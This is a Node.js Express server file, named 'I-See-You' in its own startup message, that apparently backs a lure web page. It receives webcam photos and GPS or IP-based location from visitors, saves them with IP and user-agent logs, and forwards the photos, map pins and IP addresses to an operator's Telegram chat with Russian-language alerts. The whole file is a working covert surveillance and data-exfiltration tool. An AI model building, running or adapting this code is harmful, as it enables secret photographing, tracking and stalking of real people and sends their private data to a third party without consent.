const express = require('express');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const app = express();
const port = 8080;

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Function to send message to Telegram
async function sendTelegramMessage(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return null;
    
    try {
        const response = await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        return response.data;
    } catch (error) {
        console.error('Error sending Telegram message:', error.message);
        return null;
    }
}

// Function to send photo to Telegram
async function sendTelegramPhoto(photoPath, caption = '') {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.log('Telegram bot token or chat ID not configured');
        return null;
    }
    
    try {
        const FormData = require('form-data');
        const form = new FormData();
        
        // Append the photo file
        form.append('photo', fs.createReadStream(photoPath));
        
        // Add other fields
        form.append('chat_id', TELEGRAM_CHAT_ID);
        form.append('caption', caption.substring(0, 1024));
        
        console.log(`Sending photo to Telegram: ${photoPath}`);
        
        // Send the request
        const response = await axios({
            method: 'post',
            url: `${TELEGRAM_API_URL}/sendPhoto`,
            headers: {
                ...form.getHeaders(),
            },
            data: form
        });
        
        console.log('✅ Photo sent to Telegram successfully');
        return response.data;
    } catch (error) {
        console.error('❌ Error sending Telegram photo:', error.message);
        if (error.response) {
            console.error('Response status:', error.response.status);
            console.error('Response data:', error.response.data);
        }
        return null;
    }
}

// Ensure directories exist
const photosDir = path.join(__dirname, 'photos');
const logsDir = path.join(__dirname, 'logs');

[photosDir, logsDir].forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
});

// Log file path
const logFilePath = path.join(logsDir, 'logs.txt');

// Function to append log entry
const logEntry = async (data) => {
    try {
        const timestamp = new Date().toISOString();
        const logEntry = `[${timestamp}] ${JSON.stringify(data)}\n`;
        await fs.promises.appendFile(logFilePath, logEntry, 'utf8');
    } catch (error) {
        console.error('Error writing to log file:', error);
    }
};

// Middleware
app.use(express.static('public'));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ limit: '10mb', extended: true }));

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Track the last location to avoid duplicates
let lastLocation = null;

// Track last photo time to prevent duplicates
let lastPhotoTime = 0;

// Handle location data
app.post('/location', async (req, res) => {
    try {
        const { latitude, longitude, accuracy, approximate } = req.body;
        const mapsUrl = `https://www.google.com/maps/place/${latitude}+${longitude}`;
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
        const cleanIp = ip.replace('::ffff:', '').replace('::1', 'localhost');
        const timestamp = new Date().toLocaleString();
        
        // Skip if this is a duplicate of the last location
        const currentLocation = `${latitude},${longitude}`;
        if (lastLocation === currentLocation) {
            return res.json({ status: 'success', duplicate: true });
        }
        lastLocation = currentLocation;
        
        console.log('\n🌍 Location Update:');
        console.log(`📍 ${timestamp}`);
        console.log(`🌐 ${mapsUrl}`);
        
        let locationMessage = `📍 New Location Update\n`;
        locationMessage += `⏰ Time: ${timestamp}\n`;
        locationMessage += `🌐 ${mapsUrl}\n`;
        
        if (approximate) {
            console.log('⚠️  Approximate location (IP-based)');
            locationMessage += '⚠️ Approximate location (IP-based)\n';
        } else if (accuracy) {
            console.log(`📡 Accuracy: ${accuracy} meters`);
            locationMessage += `📡 Accuracy: ${accuracy} meters\n`;
        }
        
        console.log(`🖥️  IP: ${cleanIp}`);
        locationMessage += `🖥️ IP: ${cleanIp}\n`;
        
        // Send location to Telegram
        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
            try {
                // Send location as a pin on the map
                await axios.post(`${TELEGRAM_API_URL}/sendLocation`, {
                    chat_id: TELEGRAM_CHAT_ID,
                    latitude: parseFloat(latitude),
                    longitude: parseFloat(longitude)
                });
                
                // Send the formatted message
                await sendTelegramMessage(locationMessage);
            } catch (error) {
                console.error('Error sending location to Telegram:', error.message);
            }
        }
        
        res.json({ 
            status: 'success',
            approximate: !!approximate,
            accuracy: accuracy || 'unknown',
            ip: cleanIp
        });
    } catch (error) {
        console.error('Error handling location update:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// Handle photo data
app.post('/photo', async (req, res) => {
    try {
        const { photo, latitude, longitude, accuracy, approximate } = req.body;
        
        // Validate photo data
        if (!photo || typeof photo !== 'string') {
            throw new Error('No photo data received');
        }
        
        const now = Date.now();
        
        // Rate limiting - prevent processing photos too quickly
        if (now - lastPhotoTime < 1000) {
            return res.json({
                status: 'success',
                skipped: true,
                reason: 'Rate limited'
            });
        }
        lastPhotoTime = now;
        
        const timestamp = new Date();
        const timestampStr = timestamp.toISOString().replace(/[:.]/g, '-');
        const photoSizeKB = (photo.length / 1024).toFixed(2);
        
        // Get client IP
        const ip = req.headers['x-forwarded-for'] || 
                  req.connection.remoteAddress || 
                  req.socket.remoteAddress ||
                  (req.connection.socket ? req.connection.socket.remoteAddress : null);
        const cleanIp = ip ? ip.replace('::ffff:', '').replace('::1', 'localhost') : 'unknown';
        
        // Create a filename with timestamp
        const filename = `photo_${timestampStr}.jpg`;
        const filePath = path.join(photosDir, filename);
        const base64Data = photo.replace(/^data:image\/jpeg;base64,/, '');
        
        // Save the photo
        try {
            await fs.promises.writeFile(filePath, base64Data, 'base64');
        } catch (error) {
            console.error('Error saving photo file:', error);
            return res.status(500).json({
                status: 'error',
                error: 'Failed to save photo file',
                message: error.message
            });
        }
        
        // Create a log entry
        const logData = {
            type: 'photo',
            timestamp: timestamp.toISOString(),
            filename: filename,
            sizeKB: parseFloat(photoSizeKB),
            location: {
                latitude: latitude || null,
                longitude: longitude || null,
                accuracy: accuracy || null,
                approximate: !!approximate,
                source: approximate ? 'ip' : 'gps'
            },
            device: {
                ip: cleanIp,
                userAgent: req.headers['user-agent']
            },
            filePath: filePath
        };
        
        // Log the entry to the log file
        await logEntry(logData);
        
        // Prepare console output
        console.log('\n📸 Photo Captured:');
        console.log(`⏰ ${timestamp.toLocaleString()}`);
        
        // Format the message for Telegram with HTML tags as plain text
        let photoMessage = `📸 НОВЫЙ СНИМОК\n`;
        photoMessage += `⏱ Время: ${timestamp.toLocaleString('ru-RU')}\n`;
        
        if (latitude !== undefined && longitude !== undefined) {
            const mapsUrl = `https://www.google.com/maps/place/${latitude}+${longitude}`;
            console.log(`📍 ${latitude}, ${longitude}`);
            console.log(`🌐 ${mapsUrl}`);
            
            // Format coordinates for better readability
            const lat = parseFloat(latitude).toFixed(6);
            const lng = parseFloat(longitude).toFixed(6);
            
            // Construct the message with HTML tags as plain text
            photoMessage = [
                '📸 НОВЫЙ СНИМОК',
                `⏱ Время: ${timestamp.toLocaleString('ru-RU')}`,
                `📍 Координаты: ${mapsUrl}">${lat}, ${lng}`,
                approximate ? '⚠️ Приблизительное местоположение (по IP)' : 
                           (accuracy ? `📏 Точность: ${Math.round(accuracy)} метров` : ''),
                `📊 Размер: ${photoSizeKB} КБ`,
                `🌐 IP: ${cleanIp}`
            ].filter(Boolean).join('\n');
            
            if (approximate) {
                console.log('⚠️  Приблизительное местоположение (по IP)');
            } else if (accuracy) {
                console.log(`📡 Точность: ${Math.round(accuracy)} метров`);
            }
        } else {
            console.log('📍 Нет данных о местоположении');
            photoMessage = [
                '📸 НОВЫЙ СНИМОК',
                `⏱ Время: ${timestamp.toLocaleString('ru-RU')}`,
                '📍 Нет данных о местоположении',
                `📊 Размер: ${photoSizeKB} КБ`,
                `🌐 IP: ${cleanIp}`
            ].join('\n');
        }
        
        console.log(`📷 Фото сохранено: ${filename}`);
        console.log(`📁 Путь: ${filePath}`);
        console.log(`📏 Размер: ${photoSizeKB} КБ`);
        console.log(`🖥️  IP: ${cleanIp}`);
        
        // Send photo to Telegram
        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
            try {
                // First send the photo with caption (limited to 1024 chars)
                const caption = photoMessage.length > 1024 ? 'Photo captured - see next message for details' : photoMessage;
                
                await sendTelegramPhoto(filePath, caption);
                
                // If message was too long, send the rest as a separate message
                if (photoMessage.length > 1024) {
                    await sendTelegramMessage(photoMessage);
                }
                
                // If we have location data, send it as a location pin
                if (latitude !== undefined && longitude !== undefined) {
                    await axios.post(`${TELEGRAM_API_URL}/sendLocation`, {
                        chat_id: TELEGRAM_CHAT_ID,
                        latitude: parseFloat(latitude),
                        longitude: parseFloat(longitude)
                    });
                }
            } catch (error) {
                console.error('Error sending photo to Telegram:', error.message);
            }
        }
        
        res.json({ 
            status: 'success',
            saved: true,
            filename: filename,
            timestamp: timestamp.toISOString()
        });
        
    } catch (error) {
        console.error('Error saving photo:', error);
        res.status(500).json({
            status: 'error',
            error: 'Failed to save photo',
            message: error.message
        });
    }
});

// Start server
app.listen(port, () => {
    console.log(`\n🚀 I-See-You server running at http://localhost:${port}`);
    console.log('Waiting for client to connect...\n');
    
    // Check if Telegram is configured
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        console.log('✅ Telegram notifications are enabled');
        sendTelegramMessage('🚀 <b>I-See-You server is now online!</b>\nMonitoring for photos and location updates...');
    } else {
        console.log('ℹ️  Telegram notifications are not configured');
        console.log('   To enable, set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables');
        console.log('   or use the --bot-token and --chat-id command line arguments');
    }
    console.log('');
});
